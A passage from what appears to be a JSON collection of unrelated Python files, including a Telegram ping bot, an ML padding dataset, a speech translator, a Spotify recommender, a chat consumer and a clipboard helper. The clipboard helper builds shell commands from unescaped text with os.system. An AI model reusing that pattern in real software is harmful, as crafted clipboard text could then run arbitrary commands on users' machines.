/ping\\n\ud83d\udd38 Change Country: /cc\\n\ud83d\udd38 Change Node: /node\\n\ud83d\udd38 Restart Bot: /res\"\n\ndef handle_json(job, key, value):\n    with open(json_conf, 'r') as file:\n        data = json.load(file)\n    if job == \"get\":\n        return data[key]\n    else:\n        if job == \"add\":\n            data[\"servers\"].append(value)\n        elif job == \"rm\":\n            data[\"servers\"].remove(value)\n        elif job == \"rep\":\n            data[key] = value\n        with open(json_conf, 'w') as file:\n            json.dump(data, file, indent=4)\n\ndef json_data():\n    user_id = int(handle_json(\"get\", \"user_id\", \"\"))\n    token = handle_json(\"get\", \"bot_token\", \"\")\n    servers = handle_json(\"get\", \"servers\", \"\")\n    ccode = handle_json(\"get\", \"ccode\", \"\")\n    cnode = handle_json(\"get\", \"node\", \"\")\n    data_dict = {\"user_id\": user_id,\n                 \"token\": token,\n                 \"servers\": servers,\n                 \"ccode\": ccode,\n                 \"cnode\": cnode\n                 }\n    return data_dict\n\ndef time_calc(ccode):\n    try:\n        country_timezones = pytz.country_timezones(ccode.upper())\n    except:\n        country_timezones = None\n    if country_timezones and ccode == \"ir\":\n        tz = pytz.timezone(country_timezones[0])\n        now = jdatetime.datetime.now(tz=tz)\n    elif country_timezones:\n        tz = pytz.timezone(country_timezones[0])\n        now = datetime.datetime.now(tz=tz)\n    else:\n        tz = pytz.timezone('UTC')\n        now = datetime.datetime.now(tz=tz)\n    time_seconds = int(now.timestamp())\n    date_str = now.strftime(f'{tz}: %Y/%m/%d %H:%M:%S')\n    return int(time_seconds), date_str\n\ndef authenticate_user(func):\n    def for_function(update: Update, context: CallbackContext):\n        user = update.effective_chat.id\n        if json_data()[\"user_id\"] == user:\n            return func(update, context)\n        else:\n            pass\n    return for_function\n\ndef get_nodes(code):\n    code = code.lower()\n    try:\n        response = requests.get(f\"{url}/nodes/hosts\")\n    except:\n        time.sleep(20)\n        get_nodes(code)\n    data = json.loads(response.text)\n    country_nodes = []\n    location = []\n    for node, info in data[\"nodes\"].items():\n        if node.startswith(code):\n            location = info[\"location\"]\n            city = location[2]\n            country_nodes.append({\"name\": city, \"node\": node})\n    if len(location) > 1 and location[1] != \"\":\n        country = location[1]\n    else:\n        country = False\n        country_nodes = False\n    return country, country_nodes\n\ndef check_host(context: CallbackContext):\n    user_id = json_data()[\"user_id\"]\n    servers = json_data()[\"servers\"]\n    ccode = json_data()[\"ccode\"]\n    cnode = json_data()[\"cnode\"]\n    selected_node = get_nodes(cnode)\n    if (selected_node[0] is not False and selected_node[1] is not False) and (selected_node[0] is not [] and selected_node[1] is not []):\n        country = selected_node[0]\n        nodes = selected_node[1]\n        time_date = time_calc(ccode)[1]\n        context.bot.send_message(chat_id=user_id, text=f\"\ud83d\udef0 Pinging Started:\\n\\n\ud83d\uddd3 {time_date}\")\n        for server in servers:\n            ping_link = f\"{url}/check-ping?host={server}\"\n            for node in nodes:\n                ping_link += f'&node={node[\"node\"]}'\n            ping_response = requests.get(ping_link, headers={\"Accept\": \"application/json\"})\n            time.sleep(20)\n            ping_data = json.loads(ping_response.text)\n            result_link = f\"{url}/check-result/{ping_data['request_id']}\"\n            result_response = requests.get(result_link, headers={\"Accept\": \"application/json\"})\n            if result_response.status_code == 200:\n                try:\n                    stat = []\n                    result_data = result_response.json()\n                    node_index = 0\n                    for pings in result_data.values():\n                        successful_pings = 0\n           ",
    "# coding: utf-8\n\n\"\"\"\n    Pluggy API\n\n    Pluggy's main API to review data and execute connectors\n\n    The version of the OpenAPI document: 1.0.0\n    Contact: hello@pluggy.ai\n    Generated by OpenAPI Generator (https://openapi-generator.tech)\n\n    Do not edit the class manually.\n\"\"\"  # noqa: E501\n\n\nimport unittest\n\nfrom pluggy_sdk.models.create_webhook import CreateWebhook\n\nclass TestCreateWebhook(unittest.TestCase):\n    \"\"\"CreateWebhook unit test stubs\"\"\"\n\n    def setUp(self):\n        pass\n\n    def tearDown(self):\n        pass\n\n    def make_instance(self, include_optional) -> CreateWebhook:\n        \"\"\"Test CreateWebhook\n            include_option is a boolean, when False only required\n            params are included, when True both required and\n            optional params are included \"\"\"\n        # uncomment below to create an instance of `CreateWebhook`\n        \"\"\"\n        model = CreateWebhook()\n        if include_optional:\n            return CreateWebhook(\n                url = '',\n                event = 'all',\n                headers = None\n            )\n        else:\n            return CreateWebhook(\n                url = '',\n                event = 'all',\n        )\n        \"\"\"\n\n    def testCreateWebhook(self):\n        \"\"\"Test CreateWebhook\"\"\"\n        # inst_req_only = self.make_instance(include_optional=False)\n        # inst_req_and_optional = self.make_instance(include_optional=True)\n\nif __name__ == '__main__':\n    unittest.main()\n",
    "import aiohttp\nfrom pydantic import AnyUrl\n\n\nclass LowMqClient:\n    def __init__(self, auth_key: str, lowmq_url: AnyUrl):\n        self.auth_key = auth_key\n        self.lowmq_url = lowmq_url\n        self.session = None\n\n    async def __aenter__(self):\n        self.session = aiohttp.ClientSession()\n        return self\n\n    async def __aexit__(self, exc_type, exc, tb):\n        await self.session.close()\n\n    async def set_auth_key(self, auth_key):\n        self.auth_key = auth_key\n\n    async def set_lowmq_url(self, lowmq_url):\n        self.lowmq_url = lowmq_url\n\n    async def add_packet(self, queue_name, payload, freeze_time_min=5):\n        url = f\"{self.lowmq_url}/msg?freezeTimeMin={freeze_time_min}\"\n        headers = {\n            \"Authorization\": f\"token {self.auth_key}\",\n            \"Content-Type\": \"application/json\",\n        }\n        data = {\"key\": queue_name, \"value\": payload}\n\n        async with self.session.post(url, headers=headers, json=data) as response:\n            response_data = await response.json()\n            return response_data\n\n    async def get_packet(self, queue_name, delete=False):\n        url = f\"{self.lowmq_url}/msg?key={queue_name}&delete={str(delete).lower()}\"\n        headers = {\"Authorization\": f\"token {self.auth_key}\"}\n\n        async with self.session.get(url, headers=headers) as response:\n            response_data = await response.json()\n            return response_data\n\n    async def delete_packet(self, queue_name, packet_id):\n        url = f\"{self.lowmq_url}/msg?key={queue_name}&_id={packet_id}\"\n        headers = {\"Authorization\": f\"token {self.auth_key}\"}\n\n        async with self.session.delete(url, headers=headers) as response:\n            if response.status == 200:\n                return True\n            else:\n                return False\n",
    "# Copyright (c) Meta Platforms, Inc. and affiliates. All Rights Reserved.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport math\n\nimport torch\n\nfrom metaseq.data import data_utils\n\nfrom . import BaseWrapperDataset\n\n\nclass PadDataset(BaseWrapperDataset):\n    def __init__(self, dataset, pad_idx, left_pad, pad_length=None):\n        super().__init__(dataset)\n        self.pad_idx = pad_idx\n        self.left_pad = left_pad\n        self.pad_length = pad_length\n\n    def collater(self, samples):\n        return data_utils.collate_tokens(\n            samples, self.pad_idx, left_pad=self.left_pad, pad_to_length=self.pad_length\n        )\n\n\nclass LeftPadDataset(PadDataset):\n    def __init__(self, dataset, pad_idx, pad_length=None):\n        super().__init__(dataset, pad_idx, left_pad=True, pad_length=pad_length)\n\n\nclass RightPadDataset(PadDataset):\n    def __init__(self, dataset, pad_idx, pad_length=None):\n        super().__init__(dataset, pad_idx, left_pad=False, pad_length=pad_length)\n\n\nclass MultiplePadDataset(BaseWrapperDataset):\n    \"\"\"\n    This class pads the given dataset to ensure that the padded size is a\n    multiple of the given `multiple`.\n\n    For instance,\n    MultiplePadDataset(\n        tgt_dataset, pad_idx=self.source_dictionary.pad(), multiple=8\n    )\n    would pad the tgt_dataset in multiples of 8.\n    \"\"\"\n\n    def __init__(self, dataset, pad_idx, multiple):\n        super().__init__(dataset)\n        self.pad_idx = pad_idx\n        self.multiple = multiple\n\n    def collater(self, samples):\n        max_len = max([s.size(0) for s in samples])\n        max_len_multiple = int(math.ceil(max_len / self.multiple)) * self.multiple\n\n        return data_utils.collate_tokens(\n            samples, self.pad_idx, left_pad=False, pad_to_length=max_len_multiple\n        )\n\n    def __getitem__(self, index):\n        l = len(self.dataset[index])\n        cur_block = []\n        cur_block.append(self.dataset[index])\n        cur_block_remain = int(math.ceil(l / self.multiple) * self.multiple)\n\n        cur_block_remain -= self.dataset[index].numel()\n        padding = cur_block[-1].new_full((cur_block_remain,), self.pad_idx)\n        cur_block.append(padding)\n\n        return torch.cat(cur_block)\n",
    "# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.\n# SPDX-License-Identifier: Apache-2.0\nimport argparse\n\nimport numpy as np\nimport openml\nimport pandas as pd\nfrom sklearn.compose import ColumnTransformer\nfrom sklearn.metrics import mean_squared_error\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.preprocessing import FunctionTransformer\nfrom sklearn.preprocessing import OneHotEncoder\n\nfrom BoostedAdaSSP import BoostedAdaSSP\n\nparser = argparse.ArgumentParser(description=\"BoostedAdaSSP\")\nparser.add_argument(\"--seed\", type=int, default=0, help=\"random seed\")\nparser.add_argument(\n    \"--num_iterations\", type=int, default=100, help=\"number of iterations\"\n)\nparser.add_argument(\"--shrinkage\", type=str, default=\"constant\")\n\nparser.add_argument(\"--epsilon\", type=float, default=1)\nparser.add_argument(\"--delta\", type=float, default=1e-6)\n\nparser.add_argument(\"--x_bound\", type=float, default=1)\nparser.add_argument(\"--y_bound\", type=float, default=1)\n\nparser.add_argument(\"--SUITE_ID\", type=int, choices=[297, 299], default=297)\n\nargs = parser.parse_args()\n\n\ndef preprocessing_data(X, y, categorical_indicator):\n    data = pd.concat((X, y), axis=1)\n    data = data.dropna(axis=0, how=\"any\")\n    X = data.iloc[:, :-1]\n    y = data.iloc[:, -1]\n\n    is_cat = np.asarray(categorical_indicator)\n\n    cat_cols = X.columns.values[is_cat]\n    num_cols = X.columns.values[~is_cat]\n\n    cat_ohe_step = (\"ohe\", OneHotEncoder(sparse_output=False, handle_unknown=\"ignore\"))\n\n    cat_pipe = Pipeline([cat_ohe_step])\n    num_pipe = Pipeline([(\"identity\", FunctionTransformer())])\n    transformers = [(\"cat\", cat_pipe, cat_cols), (\"num\", num_pipe, num_cols)]\n    ct = ColumnTransformer(transformers=transformers)\n\n    pipe = Pipeline(\n        [\n            (\"ct\", ct),\n        ]\n    )\n\n    X = pipe.fit_transform(X)\n\n    return X, y\n\n\nbenchmark_suite = openml.study.get_suite(args.SUITE_ID)  # obtain the benchmark suite\nfor task_id in benchmark_suite.tasks:  # iterate over all tasks\n    task = openml.tasks.get_task(task_id)  # download the OpenML task\n    dataset = task.get_dataset()\n\n    X, y, categorical_indicator, attribute_names = dataset.get_data(\n        dataset_format=\"dataframe\", target=dataset.default_target_attribute\n    )\n\n    X, y = preprocessing_data(X, y, categorical_indicator)\n    rng = np.random.RandomState(args.seed)\n\n    X_train, X_test, y_train, y_test = train_test_split(\n        X, y, test_size=0.2, random_state=42\n    )\n\n    model = BoostedAdaSSP(\n        args.x_bound,\n        args.y_bound,\n        args.epsilon,\n        args.delta,\n        args.num_iterations,\n        args.shrinkage,\n        rng,\n    )\n\n    model.fit(X_train, y_train)\n\n    y_score = model.predict(X_test)\n    y_score_train = model.predict(X_train)\n\n    print(\n        task_id,\n        args.seed,\n        args.epsilon,\n        args.delta,\n        args.num_iterations,\n        args.shrinkage,\n        args.x_bound,\n        args.y_bound,\n        mean_squared_error(y_train, y_score_train),\n        mean_squared_error(y_test, y_score),\n    )\n",
    "import cv2\n\npath = 'cascade/red_ball.xml' \ncameraNo = 0                      \nobjectName = 'Ball'     \nframeWidth= 640           \nframeHeight = 480           \ncolor= (0,255,0)\n\n\n\ncap = cv2.VideoCapture(cameraNo)\ncap.set(3, frameWidth)\ncap.set(4, frameHeight)\n\ndef empty(a):\n    pass\n\n\ncv2.namedWindow(\"Result\")\ncv2.resizeWindow(\"Result\",frameWidth,frameHeight+100)\ncv2.createTrackbar(\"Scale\",\"Result\",400,1000,empty)\ncv2.createTrackbar(\"Neig\",\"Result\",8,50,empty)\ncv2.createTrackbar(\"Min Area\",\"Result\",0,100000,empty)\ncv2.createTrackbar(\"Brightness\",\"Result\",180,255,empty)\n\n\ncascade = cv2.CascadeClassifier(path)\n\nwhile True:\n\n    cameraBrightness = cv2.getTrackbarPos(\"Brightness\", \"Result\")\n    cap.set(10, cameraBrightness)\n\n    success, img = cap.read()\n    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n\n    scaleVal =1 + (cv2.getTrackbarPos(\"Scale\", \"Result\") /1000)\n    neig=cv2.getTrackbarPos(\"Neig\", \"Result\")\n    objects = cascade.detectMultiScale(gray,scaleVal, neig)\n\n    for (x,y,w,h) in objects:\n        area = w*h\n        minArea = cv2.getTrackbarPos(\"Min Area\", \"Result\")\n        if area >minArea:\n            cv2.rectangle(img,(x,y),(x+w,y+h),color,3)\n            cv2.putText(img,objectName,(x,y-5),cv2.FONT_HERSHEY_COMPLEX_SMALL,1,color,2)\n            roi_color = img[y:y+h, x:x+w]\n\n    cv2.imshow(\"Result\", img)\n\n    if cv2.waitKey(1) & 0xFF == ord('q'):\n         break\n",
    "# main.py\nimport streamlit as st\nfrom audio_recorder_streamlit import audio_recorder\nfrom faster_whisper import WhisperModel\nimport os\nfrom groq_translation import groq_translate\nfrom gtts import gTTS\n\n# Set page config\nst.set_page_config(page_title='Groq Translator', page_icon='\ud83c\udfa4')\n\n# Set page title\nst.title('Groq Translator')\n\n# Load whisper model\nmodel = WhisperModel(\"base\", device=\"cpu\", compute_type=\"int8\", cpu_threads=int(os.cpu_count() / 2))\n\n# Speech to text\ndef speech_to_text(audio_chunk):\n    segments, info = model.transcribe(audio_chunk, beam_size=5)\n    speech_text = \" \".join([segment.text for segment in segments])\n    return speech_text\n\n# Text to speech\ndef text_to_speech(translated_text, language):\n    file_name = \"speech.mp3\"\n    my_obj = gTTS(text=translated_text, lang=language)\n    my_obj.save(file_name)\n    return file_name\n\nlanguages = {\n   \"Portuguese\": \"pt\",\n   \"Spanish\": \"es\",\n   \"German\": \"de\",\n   \"French\": \"fr\",\n   \"Italian\": \"it\",\n   \"Dutch\": \"nl\",\n   \"Russian\": \"ru\",\n   \"Japanese\": \"ja\",\n   \"Chinese\": \"zh\",\n   \"Korean\": \"ko\"\n}\n\n# Language selection\noption = st.selectbox(\n   \"Language to translate to:\",\n   #(\"Portuguese\", \"Spanish\", \"German\", \"French\", \"Italian\", \"Dutch\", \"Russian\", \"Japanese\", \"Chinese\", \"Korean\"),\n   #{\"Portuguese\": \"pt\", \"Spanish\": \"es\", \"German\": \"de\", \"French\": \"fr\", \"Italian\": \"it\", \"Dutch\": \"nl\", \"Russian\": \"ru\", \"Japanese\": \"ja\", \"Chinese\": \"zh\", \"Korean\": \"ko\"},\n   languages,\n   index=None,\n   placeholder=\"Select language...\",\n)\n\n# Record audio\naudio_bytes = audio_recorder()\nif audio_bytes and option:\n    # Display audio player\n    st.audio(audio_bytes, format=\"audio/wav\")\n\n    # Save audio to file\n    with open('audio.wav', mode='wb') as f:\n        f.write(audio_bytes)\n\n    # Speech to text\n    st.divider()\n    with st.spinner('Transcribing...'):\n        text = speech_to_text('audio.wav')\n    st.subheader('Transcribed Text')\n    st.write(text)\n\n    # Groq translation\n    st.divider()\n    with st.spinner('Translating...'):\n        translation = groq_translate(text, 'en', option)\n    st.subheader('Translated Text to ' + option)\n    st.write(translation.text)\n\n    # Text to speech\n    audio_file = text_to_speech(translation.text, languages[option])\n    st.audio(audio_file, format=\"audio/mp3\")\n",
    "import platform\nimport os\nimport subprocess\n\nwlcopy = os.path.join(os.path.dirname(__file__), 'bin', 'wl-copy')\nwlpaste = os.path.join(os.path.dirname(__file__), 'bin', 'wl-paste')\nxclip = os.path.join(os.path.dirname(__file__), 'bin', 'xclip')\n\ndef copy(text):\n    if platform.system() == \"Linux\" :\n\n        if os.getenv('WAYLAND_DISPLAY'):\n            os.system(wlcopy + \" \" + text)\n\n        else:\n            subprocess.run([xclip, \"-selection\", \"clipboard\"], input=text, text=True, check=True)\n\n    elif platform.system() == \"Darwin\":\n        os.system(f'echo \"{text}\" | pbcopy')\n\n    elif platform.system() == \"Windows\":\n        os.system(f'echo \"{text}\" | clip')\n\ndef run_command(command):\n    result = subprocess.run(command, shell=True, capture_output=True, text=True)\n    if result.returncode == 0:\n        return result.stdout.strip()\n    else:\n        raise RuntimeError(f\"Command '{command}' failed with exit code {result.returncode}\")\n\ndef paste():\n    if platform.system() == \"Linux\" :\n\n        if os.getenv('WAYLAND_DISPLAY'):\n            text = run_command(wlpaste)\n\n        else:\n            text = subprocess.run([xclip, \"-o\", \"-selection\", \"clipboard\"], check=True)\n\n    elif platform.system() == \"Darwin\":\n        text = run_command('pbpaste')\n\n    elif platform.system() == \"Windows\":\n        text = run_command('echo | clip')\n    \n    return text\n\n",
    "# --------------------------------------------------------\n# Based on BEiT, timm, DINO and DeiT code bases\n# https://github.com/microsoft/unilm/tree/master/beit\n# https://github.com/rwightman/pytorch-image-models/tree/master/timm\n# https://github.com/facebookresearch/deit\n# https://github.com/facebookresearch/dino\n# --------------------------------------------------------'\nfrom functools import partial\n\nimport torch\nimport torch.nn as nn\nimport torch.utils.checkpoint as cp\nfrom timm.models.layers import trunc_normal_ as __call_trunc_normal_\nfrom timm.models.registry import register_model\n\nfrom .modeling_finetune import (\n    Block,\n    PatchEmbed,\n    _cfg,\n    get_sinusoid_encoding_table,\n)\n\n\ndef trunc_normal_(tensor, mean=0., std=1.):\n    __call_trunc_normal_(tensor, mean=mean, std=std, a=-std, b=std)\n\n\nclass PretrainVisionTransformerEncoder(nn.Module):\n    \"\"\" Vision Transformer with support for patch or hybrid CNN input stage\n    \"\"\"\n\n    def __init__(self,\n                 img_size=224,\n                 patch_size=16,\n                 in_chans=3,\n                 num_classes=0,\n                 embed_dim=768,\n                 depth=12,\n                 num_heads=12,\n                 mlp_ratio=4.,\n                 qkv_bias=False,\n                 qk_scale=None,\n                 drop_rate=0.,\n                 attn_drop_rate=0.,\n                 drop_path_rate=0.,\n                 norm_layer=nn.LayerNorm,\n                 init_values=None,\n                 tubelet_size=2,\n                 use_learnable_pos_emb=False,\n                 with_cp=False,\n                 all_frames=16,\n                 cos_attn=False):\n        super().__init__()\n        self.num_classes = num_classes\n        # num_features for consistency with other models\n        self.num_features = self.embed_dim = embed_dim\n        self.patch_embed = PatchEmbed(\n            img_size=img_size,\n            patch_size=patch_size,\n            in_chans=in_chans,\n            embed_dim=embed_dim,\n            num_frames=all_frames,\n            tubelet_size=tubelet_size)\n        num_patches = self.patch_embed.num_patches\n        self.with_cp = with_cp\n\n        if use_learnable_pos_emb:\n            self.pos_embed = nn.Parameter(\n                torch.zeros(1, num_patches + 1, embed_dim))\n        else:\n            # sine-cosine positional embeddings\n            self.pos_embed = get_sinusoid_encoding_table(\n                num_patches, embed_dim)\n\n        dpr = [x.item() for x in torch.linspace(0, drop_path_rate, depth)\n               ]  # stochastic depth decay rule\n        self.blocks = nn.ModuleList([\n            Block(\n                dim=embed_dim,\n                num_heads=num_heads,\n                mlp_ratio=mlp_ratio,\n                qkv_bias=qkv_bias,\n                qk_scale=qk_scale,\n                drop=drop_rate,\n                attn_drop=attn_drop_rate,\n                drop_path=dpr[i],\n                norm_layer=norm_layer,\n                init_values=init_values,\n                cos_attn=cos_attn) for i in range(depth)\n        ])\n        self.norm = norm_layer(embed_dim)\n        self.head = nn.Linear(\n            embed_dim, num_classes) if num_classes > 0 else nn.Identity()\n\n        if use_learnable_pos_emb:\n            trunc_normal_(self.pos_embed, std=.02)\n\n        self.apply(self._init_weights)\n\n    def _init_weights(self, m):\n        if isinstance(m, nn.Linear):\n            nn.init.xavier_uniform_(m.weight)\n            if isinstance(m, nn.Linear) and m.bias is not None:\n                nn.init.constant_(m.bias, 0)\n        elif isinstance(m, nn.LayerNorm):\n            nn.init.constant_(m.bias, 0)\n            nn.init.constant_(m.weight, 1.0)\n\n    def get_num_layers(self):\n        return len(self.blocks)\n\n    @torch.jit.ignore\n    def no_weight_decay(self):\n        return {'pos_embed', 'cls_token'}\n\n    def get_classifier(self):\n        return self.head\n\n    def reset_classifier(self, num_classes, global_pool=''):\n        self.num_classes = num_classes\n        self.head = nn.Linear(\n            self.embed_dim, num_classes) if num_classes > 0 else nn.Identity()\n\n    def forward_features(self, x, mask):\n        x = self.patch_embed(x)\n\n        x = x + self.pos_embed.type_as(x).to(x.device).clone().detach()\n\n        B, _, C = x.shape\n        x_vis = x[~mask].reshape(B, -1, C)  # ~mask means visible\n\n        for blk in self.blocks:\n            if self.with_cp:\n                x_vis = cp.checkpoint(blk, x_vis)\n            else:\n                x_vis = blk(x_vis)\n\n        x_vis = self.norm(x_vis)\n        return x_vis\n\n    def forward(self, x, mask):\n        x = self.forward_features(x, mask)\n        x = self.head(x)\n        return x\n\n\nclass PretrainVisionTransformerDecoder(nn.Module):\n    \"\"\" Vision Transformer with support for patch or hybrid CNN input stage\n    \"\"\"\n\n    def __init__(self,\n                 patch_size=16,\n                 num_classes=768,\n                 embed_dim=768,\n                 depth=12,\n                 num_heads=12",
    "# ~ Import tkinter, spotipy, loadenv and pillow frameworks\nfrom tkinter import *\nfrom tkinter import ttk\nimport spotipy\nfrom spotipy.oauth2 import SpotifyOAuth\nfrom dotenv import load_dotenv\nfrom playlist import playlistsongs, playlistartists\n\n# ~ gets local environment files for CLIENT ID, CLIENT SECRET and REDIRECT URI\nload_dotenv()\n\n# ~ sets the scope of the library to read a users listening history\nscope = 'user-top-read'\nsp = spotipy.Spotify(auth_manager=SpotifyOAuth(scope=scope))\n\n# ~ Sets the main application window\nroot = Tk()\n# ~ Sets the title and base size of the application\nroot.title(\"Recommendify\")\nroot.geometry(\"1000x250\")\n\n# ~ Sets the main frame of the application\nmainframe = ttk.Frame(root, padding='3 3 12 12')\nmainframe.grid(column=0, row=0, sticky=(N, W, E, S))\nroot.columnconfigure(0, weight=1)\nroot.rowconfigure(0, weight=1)\n\n# ~ setting frames and borders to keep labels together\ntopsongs = ttk.Frame(mainframe, padding='3 3 12 12')\ntopsongs.grid(column=1,row=2)\ntopsongs['borderwidth'] = 2\ntopsongs['relief'] = 'raised'\ntopartist = ttk.Frame(mainframe, padding='3 3 12 12')\ntopartist.grid(column=6, row=2)\ntopartist['borderwidth'] = 2\ntopartist['relief'] = 'raised'\nsongrecs = ttk.Frame(mainframe, padding='3 3 12 12')\nsongrecs.grid(column=1, row=4)\nsongrecs['borderwidth'] = 2\nsongrecs['relief'] = 'raised'\nartistrecs = ttk.Frame(mainframe, padding='3 3 12 12')\nartistrecs.grid(column=6, row=4)\nartistrecs['borderwidth'] = 2\nartistrecs['relief'] = 'raised'\n\n\n\n# ~ Labels of text\nttk.Label(mainframe, text='Top 5 Songs of the past 12 months').grid(column=1, row=1, sticky=(W, S))\nttk.Label(mainframe, text='Top 5 Artists of the past 12 months').grid(column=6, row=1, sticky=(W, S))\nttk.Label(mainframe, text='5 Song Recommendations').grid(column=1, row=3, sticky=(W, S))\nttk.Label(mainframe, text='5 Artist Recommendations').grid(column=6, row=3, sticky=(W, S))\n\n# ~ function to get a users top 5 tracks of the past 12 months\ndef top5tracks():\n    # ~ sets the range of data to the past 12 months\n    for sp_range in ['long_term']:\n\n        # ~ sets a variable to a dictionary containing information about the users 5 top tracks\n        songresults = sp.current_user_top_tracks(time_range=sp_range, limit=5)\n\n        # ~ iterates through the dictionary and shows the name of the song and the artist's name\n        for i, item in enumerate(songresults['items']):\n            # ~ item['album']['images'][0]['url']) will implement image functionality at a later date\n            songname = (str(i + 1) + \". \" + item['name'])\n            artistname = item['artists'][0]['name']\n            ttk.Label(topsongs, text=songname).grid(column=i+1, row=1, sticky=(W))\n            ttk.Label(topsongs, text=artistname ).grid(column=i+1, row=2, sticky=(W))\n    return songresults\n\n# ~ function to get the top 5 artists of a user\ndef top5artists():\n    # ~ sets the range of data to the past 12 months\n    for sp_range in ['long_term']:\n\n        # ~ sets a variable to a dictionary containing information about the users 5 top artists\n        artistresults = sp.current_user_top_artists(time_range=sp_range, limit=5)\n\n        # ~ iterates through the dictionary and shows the artist's name\n        for i, item in enumerate(artistresults['items']):\n            artistname = (str(i+1) + \". \" + item['name'])\n            ttk.Label(topartist, text=artistname).grid(column=i + 1, row=1, sticky=(W))\n    return artistresults\n\n\n# ~ function to get recommendations based on top 5 tracks of a user\ndef songrecommendations(songresults):\n    # ~ initialise the array of track ids that will be used to seed the recommendations\n    trackseed = [\" \"] * 5\n\n    # ~ iterates through the songresults dictionary and stores each song's unique id\n    for i, item in enumerate(songresults['items']):\n        trackseed[i] = item['id']\n\n    # ~ sets a variable to a dictionary containing 5 song recommendations based on the 5 songs input\n    srecresults = sp.recommendations(seed_tracks=trackseed, limit=5)\n\n    # ~ displays the 5 song recommendations\n    for i in range(5):\n        recs = (str(i + 1) + \". \" + srecresults['tracks'][i]['name'])\n        artistname = srecresults['tracks'][i]['artists'][0]['name']\n        ttk.Label(songrecs, text=recs).grid(column=i+1, row=1, sticky=(W))\n        ttk.Label(songrecs, text=artistname).grid(column=i + 1, row=2, sticky=(W))\n    return srecresults\n\n# ~ function to get artist recommendations based on a users top 5 artists\ndef artistrecommendations(artistresults):\n    # ~ initialise seed array and iterate to store artists unique id\n    artistseed = [\" \"] * 5\n    for i, item in enumerate(artistresults['items']):\n        artistseed[i] = item['id']\n\n    # ~ sets a variable to a dictionary containing 5 song recommendations based on the 5 artists input\n    results = sp.recommendations(seed_artists=artistseed, limit=5)\n\n    # ~ displays the artists of the song recommendations found\n    for i in range(5):\n        recs = (str(i + 1) + \". \" + results['track",
    "import json\nimport base64\nfrom asgiref.sync import async_to_sync\nfrom channels.generic.websocket import WebsocketConsumer\n\n\nclass ChatConsumer(WebsocketConsumer):\n    def connect(self):\n        self.room_name = self.scope[\"url_route\"][\"kwargs\"][\"room_name\"]\n        self.room_group_name = f\"chat_{self.room_name}\"\n\n        # Join room group\n        async_to_sync(self.channel_layer.group_add)(\n            self.room_group_name, self.channel_name\n        )\n\n        self.accept()\n\n    def disconnect(self, close_code):\n        # Leave room group\n        async_to_sync(self.channel_layer.group_discard)(\n            self.room_group_name, self.channel_name\n        )\n\n    # Receive message from WebSocket\n    def receive(self, text_data):\n        text_data_json = json.loads(text_data)\n        message = text_data_json[\"message\"]\n        # Encode the message to bytes using the correct encoding\n        encoded_message = message.encode('utf-8')\n        # Base64 encode the message\n        encoded_message_base64 = base64.b64encode(encoded_message).decode('utf-8')\n        # Send message to room group\n        print(encoded_message_base64)\n        async_to_sync(self.channel_layer.group_send)(\n            self.room_group_name, {\"type\": \"chat.message\", \"message\": encoded_message_base64}\n        )\n\n    # Receive message from room group\n    def chat_message(self, event):\n        message = event[\"message\"]\n        # Decode the base64 encoded message\n        decoded_message_base64 = base64.b64decode(message)\n        # Decode the bytes to UTF-8 string\n        decoded_message = decoded_message_base64.decode('utf-8')\n\n        # Send message to WebSocket\n        self.send(text_data=json.dumps({\"message\": decoded_message}))\n",
    "import requests\nfrom datetime import datetime\n\ndef discord(summary, discord_webhook, version, total_runtime):\n    current_date = datetime.now()\n    image_url = \"https://raw.githubusercontent.com/mikenobbs/AssetAssistant/main/logo/logomark.png\"\n    footer_text = f\"Asset Assistant [v{version}] | {current_date.strftime('%d/%m/%Y %H:%M')}\"\n    color = 0x9E9E9E\n\n    embed = {\n        \"title\": \"Asset Assistant\",\n        \"description\": summary,\n        \"thumbnail\": {\"url\": image_url},\n        \"footer\": {\"text\": footer_text},\n        \"color\": color\n    }\n\n    response = requests.post(discord_webhook, json={\"embeds\": [embed]})\n\ndef summary(moved_counts, backup_enabled, total_runtime, version):\n    summary = f\"**Movie Assets:**\\n {moved_counts['movies_dir']}\\n\"\n    summary += f\"**Show Assets:**\\n {moved_counts['shows_dir']}\\n\"\n    summary += f\"**Collection Assets:**\\n {moved_counts['collections_dir']}\\n\"\n    summary += f\"**Failures:**\\n {moved_counts['failed_dir']}\\n\"\n    summary += f\"**Backup Enabled?**\\n {'Yes' if backup_enabled else 'No'}\\n\"\n    summary += f\"**Total Run Time:**\\n {total_runtime:.2f} seconds\\n\"\n    return summary\n",
    "import uvicorn\r\nimport random\r\nfrom fastapi import FastAPI, Request, Response\r\n\r\napp = FastAPI()\r\n\r\n\r\nuser = {\r\n    \"127.0.0.1\": {\"port\": 0, \"need_changed\": False}\r\n}\r\n\r\n\r\n@app.get(\"/\")\r\ndef view(req:Request):\r\n    ip = req.client.host\r\n    port = req.client.port\r\n\r\n    content = \"success\"\r\n\r\n    # \u521d\u59cb\u5316\r\n    if ip in user:\r\n        # \u68c0\u6d4b\u722c\u866b\r\n        if (user[ip][\"need_changed\"]==True and user[ip][\"port\"] == port) or \\\r\n           (user[ip][\"need_changed\"]==False and user[ip][\"port\"] != port):\r\n                content = \"failed\"\r\n    else:\r\n        user[ip] = {\"port\": port, \"need_changed\": False}\r\n\r\n\r\n    print(ip, port, user[ip][\"port\"], user[ip][\"need_changed\"])\r\n\r\n\r\n    connection = \"keep-alive\" if random.randint(1, 10) > 5 else \"close\"\r\n    if connection == \"keep-alive\":\r\n        user[ip][\"need_changed\"] = False\r\n    else:\r\n        user[ip][\"need_changed\"] = True\r\n\r\n    # \u66f4\u65b0 port\r\n    user[ip][\"port\"] = port\r\n\r\n    return Response(\r\n        content=content,\r\n        headers={\r\n            \"connection\": connection\r\n        }\r\n    )\r\n\r\n\r\n# uvicorn.run(app, host='0.0.0.0', port=9242)",
